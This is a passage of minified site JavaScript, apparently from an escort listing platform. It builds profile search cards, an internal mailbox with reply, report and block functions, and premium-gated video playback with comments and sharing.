mrgTop2"><span class="left">'+translate("common-onlinenow")+'</span><div class="overflowHidden"></div></div>':'<div class="profilesStatus ofline mrgTop2"><span class="left">'+e.lastOnline+'</span><div class="overflowHidden"></div></div>';var a=ucfirst(e.username);if("grid"==searchView)var i='<li><div class="profileBox"><div class="searchTopRight '+(""!=e.distance_display?"has-location":"")+'"><div class="searchTopRightContent">'+(1==e.prebooking_only?'<div class="user-token-clock mrgBot safeModeTooltipContainer safeModeTooltipMobile" title="'+e.username+' is available for future bookings and online services, but prefers not to meet other people in person at the moment."></div>':"")+(0!=e.photo_verified||0!=e.id_verified?(1==e.photo_verified?'<div class="user-token-photo mrgBot" title="'+translate("common-usernamehasverifiedphotos",{username:a})+'"></div>':"")+(1==e.id_verified?'<div class="user-token-id mrgBot" title="'+translate("common-usernamehasverifiedid",{username:a})+'"></div>':""):"")+"</div></div>"+(""!=e.distance_display?'<div class="escort-distance" title="'+e.username+" is "+e.distance_display+'km from you">'+e.distance_display+"<br></div>":"")+(1==e.active_plan&&1==e.user_type&&1!=e.is_sponsor&&0==e.platinum_member?'<div class="gold"></div>':"")+(1==e.is_sponsor&&0==e.platinum_member?'<div class="vip-sponsor">VIP SPONSOR</div>':"")+(1==e.platinum_member?'<div class="platinum-search"><div class="platinum-box"><div class="platinum-title webfont">Platinum Boost</div><div class="platinum-border"><div class="profileBox-info"><a href="/'+e.username+'#platinum" class="txtWhite"><div class="txtUppercase txtBold mrgLeft2">'+e.username+'</div></a><a href="'+e.search_url+'"><div class="txtUppercase mrgLeft2 txtGrayC txt13">'+(3==e.location_type?'<span class="travel-icon '+(1==e.travels.active?"active":"pending")+'"></span>':"")+e.location+"</div></a>"+t+'</div><a href="/'+e.username+'#platinum" class="platinum-img" style="background-image: url('+e.photo+');"></a></div><div class="platinum-blur" style="background-image: url('+e.photo+');"></div></div></div>':'<div class="photo-big-tall relative full-width"><div class="profileBox-info"><a href="/'+e.username+'" class="txtWhite"><div class="txtUppercase txtBold mrgLeft2">'+e.username+'</div></a><a href="/'+e.search_url+'" class="txtWhite"><div class="txtUppercase mrgLeft2">'+(3==e.location_type?'<span class="travel-icon '+(1==e.travels.active?"active":"pending")+'"></span>':"")+e.location+"</div></a>"+t+'</div><a href="/'+e.username+'"><div class="img-cover full-width" style="background-image: url('+e.photo+');"></div></a></div>')+'<div class="profileBox-desc-featured"><div class="profile-desc-pad '+(1==e.platinum_member?"txtLightPink":"")+'">'+e.description+"</div></div></div></li>";else i='<li class="clear"><div class="list-flex"><div class="list-photo"><div class="profileBox">'+(1==e.active_plan&&1==e.user_type&&1!=e.is_sponsor&&0==e.platinum_member?'<div class="gold"></div>':"")+(1==e.is_sponsor&&0==e.platinum_member?'<div class="vip-sponsor">VIP SPONSOR</div>':"")+(1==e.platinum_member?'<div class="platinum-search"><div class="platinum-box"><div class="platinum-title webfont">Platinum Boost</div><div class="platinum-border"><div class="profileBox-info">'+t+'</div><a href="/'+e.username+'#platinum" class="platinum-img" style="background-image: url('+e.photo+');"></a></div><div class="platinum-blur" style="background-image: url('+e.photo+');"></div></div></div>':'<div class="photo-big-tall relative full-width" style="width: 100%;"><div class="profileBox-info"><a href="/'+e.username+'" class="txtWhite"><div class="txtUppercase txtBold mrgLeft2">'+e.username+'</div></a><a href="/'+e.search_url+'" class="txtWhite"><div class="txtUppercase mrgLeft2">'+(3==e.location_type?'<span class="travel-icon '+(1==e.travels.active?"active":"pending")+'"></span>':"")+e.location+"</div></a>"+t+'</div><a href="/'+e.username+'"><div class="img-cover full-width" style="background-image: url('+e.photo+');"></div></a></div>')+'</div></div><div class="list-info"><div class="list-info-hat"><div class="list-info-name"><a href="/'+e.username+'" class="mrgRight txtCapitalize txtWhite">'+e.username+"</a>"+(1==e.photo_verified?'<span class="user-token-photo" title="'+translate("common-usernamehasverifiedphotos",{username:a})+'"></span>':"")+(1==e.id_verified?'<span class="user-token-id" title="'+translate("common-usernamehasverifiedid",{username:a})+'"></span>':"")+(1==e.prebooking_only?'<span class="user-token-clock" title="'+e.username+' is available for future bookings and online services, but prefers not to meet other people in person at the moment."></span>':"")+'</div><a class="list-info-loc pointer" href="'+e.search_url+'"><span class="list-info-pin"></span>'+e.location+'</a></div><div class="list-info-desc-box"><div class="list-desc-overflow"><div class="txtWhite txt16 mrgBot">'+e.headline+'</div><div class="txt14">'+e.description+'</div></div></div><div class="list-stats-box">'+(0!=e.type?'<div class="list-stats"><div class="txt15 mrgBot">'+translate("common-iam")+'</div><div class="list-stats-txt txtWhite txtBold">'+e.typeLabel+"</div></div>":"")+'<div class="list-stats"><div class="txt15 mrgBot">'+translate("common-age")+'</div><div class="list-stats-txt txtWhite txtBold">'+e.age+" y/o</div></div>"+(0!=e.ethnicity?'<div class="list-stats"><div class="txt15 mrgBot">'+translate("common-ethnicity")+'</div><div class="list-stats-txt txtWhite txtBold">'+e.ethnicityLabel+"</div></div>":"")+(0!=e.body_type?'<div class="list-stats"><div class="txt15 mrgBot">'+translate("common-body")+'</div><div class="list-stats-txt txtWhite txtBold">'+e.bodyTypeLabel+"</div></div>":"")+(0!=e.hair?'<div class="list-stats"><div class="txt15 mrgBot">'+translate("common-hair")+'</div><div class="list-stats-txt txtWhite txtBold">'+e.hairLabel+"</div></div>":"")+'</div><div class="list-footer"><a class="list-footer-tab block" href="/'+e.username+'"><span class="list-view-icons-profile"></span>'+translate("search-viewprofile")+'</a><a class="list-footer-tab" href="/'+e.username+'/#map"><span class="list-view-icons-map"></span>'+translate("search-mapme")+'</a><a class="list-footer-tab" href="/'+e.username+'/#contact"><span class="list-view-icons-call"></span>'+translate("profile-callme")+'</a><a class="list-footer-tab" href="/'+e.username+'/#mail"><span class="list-view-icons-mail"></span>'+translate("profile-emailme")+"</a>"+(e.videos_count>0?'<a class="list-footer-tab list-footer-tab-media" href="/'+e.username+'/#videos"><span class="list-view-icons-videos"></span>'+e.videos_count+" "+(1==e.videos_count?translate("common-video"):translate("nav-videos"))+"</a>":"")+(e.reviews_count>0?'<a class="list-footer-tab list-footer-tab-media" href="/'+e.username+'/reviews/"><span class="list-view-icons-reviews"></span>'+e.reviews_count+" "+(1==e.reviews_count?translate("common-review"):translate("reviews-reviews"))+"</a>":"")+(e.answers_count>1?'<a class="list-footer-tab list-footer-tab-media" href="/'+e.username+'/interview/"><span class="list-view-icons-interview"></span>'+e.answers_count+" "+translate("interviews-answers")+"</a>":"")+"</div></div></div></li>";return i}function searchUsersInlinePagination(){var e=$("#paginationContainer");setPagination({container:"#paginationContainer",page:parseInt(e.find(".pPage").val()),next:parseInt(e.find(".pNext").val()),prev:parseInt(e.find(".pPrev").val()),totalPages:parseInt(e.find(".pTotal").val()),buttons:{nextCallback:function(e){searchUsers(e,!0)},prevCallback:function(e){searchUsers(e,!0)}},pageSelect:{callback:function(e){searchUsers(e,!0)}}})}var bookmarksXHR,mailboxData={xhr:{},page:1,folder:"inbox"};function getEmails(e,t){(void 0===t||t<1)&&(t=1),"trash"==e&&($("#mobile-restore").removeClass("invisible"),$("#mobile-trash").addClass("invisible")),"inbox"==e&&($("#mobile-restore").addClass("invisible"),$("#mobile-trash").removeClass("invisible"),$("#mobile-archive").removeClass("invisible"),$("#mobile-spam").removeClass("invisible")),"sent"==e&&($("#mobile-archive").removeClass("invisible"),$("#mobile-trash").removeClass("invisible"),$("#mobile-restore").addClass("invisible"),$("#mobile-spam").addClass("invisible")),"spam"==e&&($("#mobile-spam").addClass("invisible"),$("#mobile-restore").removeClass("invisible"),$("#mobile-archive").removeClass("invisible")),"archive"==e&&($("#mobile-archive").addClass("invisible"),$("#mobile-restore").removeClass("invisible"),$("#mobile-sent").addClass("invisible"),$("#mobile-spam").addClass("invisible")),void 0===e&&(e="inbox"),mailboxData.page=t,mailboxData.folder=e;var a=$("#mailboxContent");swapTab($("#"+e+"MailTab")),setEmailControls("before"),"function"==typeof mailboxData.xhr.abort&&mailboxData.xhr.abort();var i="action=getEmails&folder="+e+"&page="+t+"&sort="+$("#mailboxSort").val();pageLoader("show"),mailboxData.xhr=$.ajax({type:"GET",url:"/mailbox/ajax",cache:!1,data:i,success:function(t){pageLoader("hide");var i=$.parseJSON(t);if(0==i.success)a.html('<div class="alertBox light blue">There are no emails in your <span class="txtBold">'+ucfirst(e)+"</span> folder.</div>");else{var o="";$.each(i.emails,(function(e,t){o+=getEmailRowPattern(t)})),a.html(o),setEmailControls("after"),a.css({"margin-left":"15px","margin-right":"-15px"}).animate({"margin-left":"0px","margin-right":"0px"},500)}i.totalUnread>0?($(".mails-counter").removeClass("invisible"),$(".mails-counter").text(i.totalUnread),animate($(".mails-counter").parent(),"jump")):($(".mails-counter").addClass("invisible"),$(".mails-counter").text(i.totalUnread)),setPagination({container:"#paginationContainer",page:i.page,next:i.nextPage,prev:i.prevPage,totalPages:i.totalPages,buttons:{nextCallback:function(t){getEmails(e,t)},prevCallback:function(t){getEmails(e,t)}},pageSelect:{callback:function(t){getEmails(e,t)}}})}})}function getEmailRowPattern(e){var t=1==e.isNew?"active":1==e.isReplied?"replied":"",a="openEmail("+e.id+");";return'<div class="resultBox '+t+'"><div class="floatLeft mrgRight2"><input type="checkbox" value="'+e.id+'" name="email_'+e.id+'"  id="email_'+e.id+'" /></div><a href="javascript:void(0);" onclick="'+a+'"><div class="created">'+e.created+'</div><div class="mailboxIcon envelop"></div><div class="sender">'+e.userName+"</div>"+(1==e.hasAttachments?'<div class="mailboxIcon attachment"></div>':"")+'<div class="headline">'+e.headline+"</div></a></div>"}function mailboxRemovePagination(){$("#paginationContainer").empty()}function getEmailOpenPattern(e){var t="toggleAlert('This is external email "+(1==e.isOwner?"to":"from")+" non registered user.');",a="";return e.attachments.length>0&&$.each(e.attachments,(function(e,t){a+='<a href="'+t.path_original+'" target="_blank"><img alt="" src="'+t.path_thumb+'" class="mrgRight" style="height: 80px;border: 1px solid #fff;box-shadow: 1px 1px 3px rgba(0,0,0,0.3);" /></a>'})),'<div id="emailOpenContent" class="box"><input type="checkbox" checked="checked" value="'+e.id+'" class="invisible"><div class="head"><div class="squarePhoto">'+(1==e.isInternal?'<a href="/'+e.userName+'"><img src="'+e.userPhoto+'" width="110"/></a>':'<a href="javascript:void(0);" onclick="'+t+'"><img src="'+e.userPhoto+'" width="110"/></a>')+'</div><div class="mail-info-left"><div class="mrgBot2">'+(1==e.isOwner?"To: ":"From: ")+(1==e.isInternal?'<a href="/'+e.userName+'"><span class="'+(1==e.userOnline?"color-green":"")+'">'+e.userName+"</span></a>":'<span onclick="'+t+'" class="cursorPointer">'+e.userName+'</span> <span class="txtNoBold">('+e.emailAddress+")</span>")+'</div><div class="mrgBot2">Subject: <span class="subject txtNoBold">'+e.headline+'</span></div><div class="mrgBot2">Sent on: '+e.created+'</div></div><div class="mail-info-right">'+(1==e.isOwner?"":'<div class="txtRight-mail-pos mrgBot2"><a href="javascript:void(0);" onclick="setReportEmailForm('+e.id+');">Report Email</a></div>')+(1==e.isOwner?"":'<div class="txtRight-mail-pos">'+(1==e.isBlocked?'<a href="/settings/blockedusers" class="txtRed">(User is Blocked!)</a>':'<a href="javascript:void(0);" onclick="blocksActions(\'blockEmailConfirm\', '+e.id+');" class="txtGray6">(Block This User)</a>')+"</div>")+'</div><div class="clearFix"></div><div class="sep mrgBot2 mrgTop2"></div><div class="wordWrap">'+e.message+"</div>"+(e.attachments.length>0?'<div class="glassLayer mrgTop2"><div class="floatLeft mrgRight"><div class="mailboxIcon attachment floatLeft"></div>Email Attachements</div><div class="clear mrgBot"></div>'+a+"</div>":"")+'<div class="sep mrgBot mrgTop2"></div><div class="openMailButtons">'+(1==e.canReply?'<a href="javascript:void(0);" class="button pink floatLeft mrgRight2 mrgTop txtUppercase" onclick="setReplyEmailForm('+e.id+');">Reply Email</a>':"")+'<a href="javascript:void(0);" class="button gray left txtUppercase mrgTop" onclick="getEmails(\''+mailboxData.folder+"', "+mailboxData.page+');">Go Back</a></div><div class="clearFix"></div></div>'}function openEmail(e){pageLoader("show");var t="action=openEmail&messageID="+e;$.ajax({type:"GET",url:"/mailbox/ajax",cache:!1,data:t,success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?(setEmailControls("open"),$("#mailboxContent").html(getEmailOpenPattern(t.email)).css({"margin-left":"15px","margin-right":"-15px"}).animate({"margin-left":"0px","margin-right":"0px"},500)):0==t.alertType?toggleAlert(t.message):popupSystem("accessDenied")}})}function setReportEmailForm(e){var t=translate("mailbox-youareabouttoreportthisemail")+'<div class="sep mrgTop mrgBot"></div><form id="reportEmailForm" action="" method="post"><div class="mrgLeft2 txtLeft"><label for="reportScam" class="visible mrgBot"><input type="radio" name="reportType" value="1" id="reportScam" checked="checked">'+translate("mail-scamorfraud")+'</label><label for="reportAbuse" class="visible mrgBot"><input type="radio" name="reportType" value="2" id="reportAbuse">'+translate("mail-abuseoroffence")+'</label><label for="reportOther" class="visible mrgBot2"><input type="radio" name="reportType" value="3" id="reportOther">'+translate("mail-otherpleasedescribe")+'</label></div><div class="sep mrgTop mrgBot"></div>'+translate("mailbox-helpusmakethemostadequate")+'<div class="txtLeft mrgLeft2 txtBold">'+translate("common-description")+'</div><textarea id="reportMessage" name="reportMessage" onkeyup="countChars(this, 500);" rows="4" class="input" style="width: 398px;"></textarea><div class="counter">500 '+translate("common-charactersleft")+"</div></form>";toggleConfirm({title:translate("mail-reportabuse"),text:t,buttons:{confirmLabel:translate("mailbox-reportemail")}},(function(){reportEmail(e)}))}function reportEmail(e){var t="action=reportEmail&messageID="+e+"&"+$("#reportEmailForm").serialize();pageLoader("show"),$.ajax({type:"POST",url:"/mailbox/ajax",cache:!1,data:t,success:function(e){pageLoader("hide");var t=$.parseJSON(e);0==t.success?toggleAlert(t.message):(toggleConfirm(),toggleAlert('<span class="txtBold">'+translate("mailbox-emailreportedsuccessfully")+"</span>"))}})}function setReplyEmailForm(e){var t=$("#mailboxContent .openMailButtons"),a=$("#replyEmailForm");0!=e?(a.remove(),t.slideUp("normal",(function(){t.after(replyEmailPattern(e)),$("#replySubject").keyup(),$("#replyEmailForm").slideDown("normal",(function(){animateScrollTo($("#emailOpenContent"),750,(function(){$("#replyMessage").focus()}))}))}))):a.slideUp("slow",(function(){t.slideDown(),a.remove(),animateScroll(0,750)}))}function replyEmailPattern(e){return'<div class="clearFix"></div><form id="replyEmailForm" class="replyEmailForm" action="" method="post"><div><div class="txtBold">'+translate("mailbox-replymessage")+'</div><textarea placeholder="'+translate("mailbox-enterherethereplymessage")+'" id="replyMessage" name="replyMessage" onkeyup="countChars(this, 2000);" rows="7" class="input"></textarea><div class="counter">2000 '+translate("common-charactersleft")+'</div></div><div class="sep mrgBot2 mrgTop2"></div><a href="javascript:void(0);" class="button pink floatLeft mrgRight2" onclick="replyEmail('+e+');">'+translate("mailbox-sendreply")+'</a><a href="javascript:void(0);" class="button floatLeft" onclick="setReplyEmailForm(0);">'+translate("common-cancel")+'</a><div class="clearFix"></div></form>'}function replyEmail(e){pageLoader("show");var t="action=replyEmail&messageID="+e+"&"+$("#replyEmailForm").serialize();$.ajax({type:"POST",url:"/mailbox/ajax",cache:!1,data:t,success:function(e){pageLoader("hide");var t=$.parseJSON(e);0==t.success?toggleAlert(t.message):(toggleAlert('<span class="txtBold">'+t.message+"</span>"),$("#replyEmailForm").slideUp("slow",(function(){$("#mailboxContent .openMailButtons").slideDown(),animateScroll(0,750)})))}})}function moveEmails(e,t){if(0!=e){var a,i,o;if(a=$("#mailboxContent input:checkbox"),void 0===t){if(0==(i=$("#mailboxContent input:checkbox:checked")).length)return void toggleAlert(translate("mailbox-pleaseselecttheemailsyouwanttomove"));o="",$.each(i,(function(e,t){o+=t.value+","})),o=o.slice(0,-1)}else i=$("#email_"+t),o=t;var n="action=moveEmails&toFolder="+e+"&emailsIDs="+encodeURIComponent(o);pageLoader("show"),$.ajax({type:"POST",url:"/mailbox/ajax",cache:!1,data:n,success:function(e){pageLoader("hide");var t=$.parseJSON(e);if(1==t.success){var o=parseInt(mailboxData.page);a.length==i.length&&(o-=1),getEmails(mailboxData.folder,o)}else toggleAlert(t.message);$("#mailboxMove").val(0).change().trigger("chosen:updated")}})}}function markEmails(e,t){if(0!=e){var a,i;if(void 0===t){if(0==(a=$("#mailboxContent input:checkbox:checked")).length)return void toggleAlert(translate("mailbox-pleaseselecttheemails"));i="",$.each(a,(function(e,t){i+=t.value+","})),i=i.slice(0,-1)}else a=$("#email_"+t),i=t;var o="action=markEmails&type="+e+"&emailsIDs="+encodeURIComponent(i);pageLoader("show"),$.ajax({type:"POST",url:"/mailbox/ajax",cache:!1,data:o,success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?getEmails(mailboxData.folder,mailboxData.page):toggleAlert(t.message),$("#mailboxMark").val(0).change().trigger("chosen:updated")}})}}function setEmailControls(e){var t=$("#mailboxContent"),a=$("#mailboxSort"),i=$("#mailboxMove"),o=$("#mailboxMark"),n=$("#checkAllMails"),s=$(".mailboxNavigation.checkAll"),r=$(".mailboxNavigation.deleteForever"),l=function(){t.find("input:checkbox:checked").length>0?("trash"==mailboxData.folder?r.removeClass("invisible"):"inbox"==mailboxData.folder&&o.parent().removeClass("invisible"),i.parent().removeClass("invisible")):(r.addClass("invisible"),o.parent().addClass("invisible"),i.parent().addClass("invisible"))};switch(e){case"before":i.find("option").removeClass("invisible"),i.find("."+mailboxData.folder).addClass("invisible"),i.find(".spam").addClass("invisible"),i.parent().addClass("invisible"),a.parent().addClass("invisible"),n.attr("checked",!1),s.addClass("invisible"),r.addClass("invisible"),o.find("option").removeClass("invisible"),o.parent().addClass("invisible"),"inbox"==mailboxData.folder&&i.find(".spam").removeClass("invisible");break;case"after":i.unbind("change").on("change",(function(){moveEmails(i.val())})),o.unbind("change").on("change",(function(){markEmails(o.val())})),a.parent().removeClass("invisible"),a.unbind("change").on("change",(function(){getEmails(mailboxData.folder)})),n.unbind("change").on("change",(function(){t.find("input:checkbox").attr("checked",n.is(":checked")),l()})),s.removeClass("invisible"),t.find("input:checkbox").unbind("change").on("change",(function(){l()})),r.unbind().on("click",(function(){toggleConfirm({title:"Confirm Delete",text:"Delete selected message/s forever?",buttons:{confirmLabel:"Delete Forever"}},(function(){moveEmails("deleteForever")}))}));break;case"open":a.parent().addClass("invisible"),i.parent().removeClass("invisible"),s.addClass("invisible"),"trash"==mailboxData.folder?r.removeClass("invisible"):"inbox"==mailboxData.folder&&(o.parent().removeClass("invisible"),o.find(".read").addClass("invisible")),mailboxRemovePagination()}i.trigger("chosen:updated"),o.trigger("chosen:updated")}function blocksActions(e,t,a){var i="action="+e;switch(e){case"blockEmailConfirm":return void toggleConfirm({title:translate("profile-blockuser"),text:'<div class="txtCenter"><div class="mrgBot">'+translate("profile-areyousureyouwanttoblock")+'</div><div class="mrgBot">'+translate("profile-blockuser")+"</div></div>",buttons:{confirmLabel:translate("profile-blockuser")}},(function(){blocksActions("blockEmail",t,a)}));case"blockEmail":i+="&messageID="+t;break;case"blockUserConfirm":return void toggleConfirm({title:translate("profile-blockuser"),text:'<div class="txtCenter"><div class="mrgBot">'+translate("profile-areyousureyouwanttoblock")+'</div><div class="mrgBot">'+translate("profile-youwillnotbeabletosee")+'</div><div class="separator mrgBot"></div>'+translate("profile-youcanmanageblockedusers",{openhref:'<a href="/settings/blocked">',closehref:"</a>"})+"</div>",buttons:{confirmLabel:translate("profile-blockuser")}},(function(){blocksActions("blockUser",t,a)}));case"blockUser":i+="&profileID="+t,a=function(){window.location.reload()};break;case"unblockUserConfirm":return void toggleConfirm({title:translate("common-unblockuser"),text:'<div class="txtCenter">'+translate("common-doyoureallywantto")+"</div>",buttons:{confirmLabel:translate("common-unblockuser")}},(function(){blocksActions("unblockUser",t,a)}));case"unblockUser":i+="&blockID="+t,a=function(){getBlockedUsers()};break;default:return!1}pageLoader("show"),$.ajax({type:"POST",url:"/settings/ajax",cache:!1,data:i,success:function(e){pageLoader("hide");var t=$.parseJSON(e);"function"==typeof a?a(t):toggleAlert(t.message)}})}function videoActions(e,t){var a,i={action:e,videoID:t};switch(e){case"addComment":i.comment=$("#videoComments textarea").val(),a=function(e){1==e.success?($("#videoComments textarea").val(""),videoActions("reloadComments",t)):toggleAlert(e.message)};break;case"reloadComments":a=function(e){var t="";$.each(e.comments,(function(e,a){t+=videoCommentsPattern(a)})),$("#videoCommentsContainer").html(t)};break;case"addToBookmarksPopUp":var o=$("#video"+t),n=o.find(".videoThumnail").attr("src"),s=o.find(".videoTitle").text();return void toggleConfirm({title:translate("videos-addthisvideotoyourbookmarks"),text:(void 0===n?"":'<div class="mrgAuto relative bookmarksPopupImgContainer"><div class="smallPlayContainer"><div></div></div><img alt="'+s+'" src="'+n+'" /></div>')+'<p class="txtCenter mrgTop4 mrgBot4">'+translate("videos-thisvideowillappearinyour")+' <a class="txtBold" href="/settings/bookmarks">'+translate("videos-bookmarkslist")+"</a></p>",buttons:{confirmLabel:translate("common-add")}},(function(){videoActions("addToBookmarks",t)}));case"addToBookmarks":a=function(e){toggleAlert(e.message),1==e.success&&$(".bookmark-js-"+t).addClass("pink")};break;default:return}pageLoader("show"),$.ajax({type:"POST",url:"/videos/ajax",cache:!1,data:i,error:function(){pageLoader("hide")},success:function(e){pageLoader("hide");var t=$.parseJSON(e);"function"==typeof a&&a(t)}})}function shareVideo(e,t){var a=getSMSLink("Check out this TS4Rent Video https://"+window.location.hostname+"/ts-escort-videos/play/"+t);toggleConfirm({stay:!0,title:translate("videos-sharevideo"),text:'<div class="mrgBot2 flex"><input id="shareVideoLink" type="text" class="input flex1 mrgRight2" value="https://'+window.location.hostname+"/ts-escort-videos/play/"+t+'" /><a class="flex flexItemsCenter button pink" href="javascript:void(0);" onclick="copyToClipboard(\'shareVideoLink\')">Copy Link</a></div><div class="displayTable txtCenter txtBold txtGray"><div class="displayTableRow profileSocialIconsA"><div class="displayTableCell"><a class="block button pink mrgRight2" href="javascript:void(0);" onclick="shareViaEmailPopup(\'shareVideoLink\', 62, '+t+')"><span class="socialIcons-contact"></span> '+translate("common-sendemail")+'</a></div><div class="displayTableCell"><a class="block button pink" href="http://twitter.com/home?status=Check out this TS4Rent Video https://'+window.location.hostname+"/ts-escort-videos/play/"+t+'" onclick="javascript:window.open(this.href, \'\', \'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600\');return false;"><span class="socialIcons-twitter"></span> Tweet</a></div><div class="sms-mobile-fix"><a class="block button pink mrgLeft2" href="'+a+'"><span class="socialIcons-twitter"></span> '+translate("reviews-sendsms")+"</a></div></div></div>",buttons:{confirmClass:"invisible",cancelClass:"invisible"}},(function(){}),(function(){}))}function videoCommentsPattern(e){return'<li class="clear"><a class="floatLeft mrgRight blogPic" href="/'+e.username+'"><img alt="" src="'+e.photo+'"></a><div class="overflowHidden padLeft1"><div class="clear txtBold mrgBot2"><a class="floatRight" href="'+e.location_url+'">'+e.location+'</a><a class="txtCapitalize" href="/'+e.username+'">'+e.username+'</a></div><div class="chatBubble"><div class="triangle"></div><div class="triangleShadow"></div><p>'+e.comment+'</p><div class="txtS txtWhite clear">'+e.created+'</div></div></div><div class="separator mrgTop3 mrgBot3"></div></li>'}function playVideo(e){void 0===e&&(e=0),"function"==typeof showPhoto&&showPhoto("off"),"function"==typeof swapTabProfile&&swapTabProfile("videos"),$("#profilePage").length>0&&$(".video-active-"+e).addClass("video-glow").siblings().removeClass("video-glow"),getUserVideosData(e,(function(e){initVideoPlayer(e),jwplayer().playlistItem(0).play(!0)}))}function initVideoPlayer(e){var t,a;$(window).width()>588?(t=400,a=588):t=(a=$(window).width())/1.5,jwplayer("videoPlayerContainer").setup({modes:[{type:"html5",config:{playlist:[userVideoPlayerData]}}],height:t,width:a,skin:"/public/js/jwplayer/skins/glow/glow.xml",plugins:!1,logo:{file:e.watermarkBanner,link:e.watermarkLink,hide:e.hideWatermark,margin:15,position:"top-right"},events:{onTime:function(e){e.position>0&&1==userVideoPlayerData.description.premium&&0==userVideoPlayerData.description.canSeeIt&&(jwplayer().stop(),toggleConfirm({text:'<div class="txtCenter txtWhite txtBold txt16 mrgBot3">'+translate("videos-thisisjustapreviewofthis")+'</div><div class="mrgBot2 txtCenter">You need to be a <a href="/payments/">Premium member</a> in order to see the rest of this video.</div> <div class="mrgBot3 txtCenter">Visit your <a href="/account/">Account Settings</a> and follow the steps to <a class="txtRed" href="/payments/">Premium membership</a>!</div>',buttons:{confirmLabel:translate("videos-becomeapremiumclient"),cancelLabel:"Ok"}},(function(){window.location="/payments/"})))},onError:function(e){},onFullscreen:function(e){!0===e.fullscreen?$(".toolbarWrapper").addClass("invisible"):$(".toolbarWrapper").removeClass("invisible")}}})}function videoPopup(e){var t,a;$(window).width()>620?(t=300,a=366):t=(a=270)/1.2;var i=function(e){toggleAlert('<div class="mrgAuto"><div id="videoPlayerContainer"></div></div>',"Play Video",(function(){jwplayer("videoPlayerContainer").setup({modes:[{type:"html5",config:{playlist:[{file:e}]}}],height:t,width:a,skin:"/public/js/jwplayer/skins/glow/glow.xml",plugins:!1,logo:{file:"",link:"",hide:!0,margin:15,position:"bottom-left"},events:{}}).onReady((function(){centerAlert()}))}))};if("undefined"==typeof jwplayer)return $.getScript("/public/js/jwplayer/jwplayer.js",(function(){i(e)})),!1;i(e)}function getUserVideosData(e,t){pageLoader("show"),$.ajax({type:"GET",url:"/profile/ajax",cache:!1,data:{action:"getUserVideo",userID:profileID,videoID:e},success:function(e){pageLoader("hide"),handleVideoData($.parseJSON(e),t)}})}function handleVideoData(e,t){var a=$("#premiumVideoContainer"),i=$("#mainVideoContainer");if(1==e.success){if(0==e.video.canSeeIt)return 1==e.video.premium?$("#premiumVideoContainer").html(premiumVideoPattern("premium")):$("#premiumVideoContainer").html(premiumVideoPattern("xrated")),$("#videoPhotoBlur").css("background-image","url('"+e.video.thumbnail+"')"),a.removeClass("invisible"),i.addClass("invisible"),void("object"==typeof jwplayer()&&jwplayer().stop());i.removeClass("invisible"),a.addClass("invisible"),userVideoPlayerData={file:e.video.video_path,title:e.video.title,image:e.video.thumbnail,description:{premium:e.video.premium,canSeeIt:e.video.canSeeIt},duration:e.video.duration};var o=$.makeArray(e.video.fetishes);$(".video-views-js").text(e.video.clicks),$(".video-uploaded-js").text(e.video.uploaded),$(".video-duration-js").text(e.video.duration),$(".video-title-js").html(e.video.title),$(".video-description-js").html(e.video.description),$(".video-fetishes-js").text(o.join(", "));var n=$("#videoAffiliateContainer");n.addClass("invisible"),e.video.is_affiliated&&(n.removeClass("invisible"),n.find(".affiliateTitle").html(e.video.affiliate_title),n.find(".affiliateDescription").text(e.video.affiliate_description),n.find(".affiliateVideoBanners").unbind().on("click",(function(){window.open(e.video.affiliate_link,"_blank")})));var s=$("#videoCommentsButton");0==e.video.allow_comments?s.addClass("invisible"):s.removeClass("invisible");var r="";1==e.video.hasComments&&1==e.video.allow_comments&&$.each(e.video.comments,(function(e,t){r+=videoCommentsPattern(t)})),$("#videoCommentsContainer").html(r),$("#bookmarkVideo").unbind().on("click",(function(){videoActions("addToBookmarksPopUp",e.video.video_id)})),$("#bookmarkVideoMobile").unbind().on("click",(function(){videoActions("addToBookmarksPopUp",e.video.video_id)})),$("#shareVideo").unbind().on("click",(function(){shareVideo(e.video.username,e.video.video_id)})),$("#shareVideoMobile").unbind().on("click",(function(){shareVideo(e.video.username,e.video.video_id)})),$("#submitCommentButton").unbind().on("click",(function(){videoActions("addComment",e.video.video_id)})),"function"==typeof t&&t(e.video.watermarkData)}else toggleAlert(e.message)}function copyToClipboard(e){var t=$("#"+e);t.select(),t[0].setSelectionRange(0,99999),document.execCommand("copy"),toggleAlert("The link was copied to the clipboard: "+t.val())}function premiumVideoPattern(e){var t="";return"xrated"==e?t+='<div class="pgWideRequest videoBlur relative overflowHidden"><div id="videoPhotoBlur" class="videoPhotoBlur"></div><div class="relative" style="padding: 10px 30px;"><div class="pgrequest-unlock"></div><p class="pgrequestTitle mrgBot3 txtWhite">'+translate("common-unlockthisvideo")+'</p><p class="txt14 txtCenter txtWhite">'+translate("videos-inordertoseethisvideoyouneedtobe")+'</p><div class="clear mrgHor"><div class="floatLeft split2"><a href="/register/" rel="nofollow" onclick="" class="button gray bigButton filled mrgRight2 block"><span>'+translate("common-signup")+'</span></a></div><div class="floatLeft split2"><a href="/login/" rel="nofollow" class="button red bigButton filled mrgLeft2 block"><span>'+translate("login-login")+"</span></a></div></div></div></div>":"premium"==e&&(t+='<div class="pgWideRequest videoBlur relative overflowHidden"><div id="videoPhotoBlur" class="videoPhotoBlur"></div><div class="relative video-dimmer" style="padding: 10px 30px;"><div class="pgrequest-unlock"></div><p class="pgrequestTitle mrgBot3 txtWhite">'+translate("videos-unlockvideo")+"</p>"+(isLogged?'<p class="txt14 txtCenter txtWhite">'+translate("videos-inordertoseethisvideoyoumustbeapremium")+'</p><div class="clear mrgHor"><a href="/payments/" rel="nofollow" class="button red bigButton block">'+translate("common-becomeapremiummember")+"</a></div>":'<p class="txt14 txtCenter txtWhite">'+translate("common-inordertoseethisvideojs")+'</p><div class="clear mrgHor"><div class="floatLeft split2"><a href="/register/" rel="nofollow" class="button pink bigButton mrgRight2 block">'+translate("common-signup")+'</a></div><div class="floatLeft split2"><a href="/login/" rel="nofollow" class="button pink bigButton mrgLeft2 block">'+translate("login-login")+'</a></div></div><div class="mrgTop2"><a href="/ts-escort-videos/" rel="nofollow" class="button gray bigButton block">'+translate("common-backtovideos")+"</a></div>")+"</div></div>"),t}function setVideoRating(e,t){for(var a="",i=1;i<=5;i++)a+='<span class="ratingStar '+(i<=t.stars?"active":"")+'" onclick="rateVideo('+e+", "+i+');"></span>';return'Rate this video:<div class="inlineBlock smallRatingStars mrgLeft">'+a+'</div><div 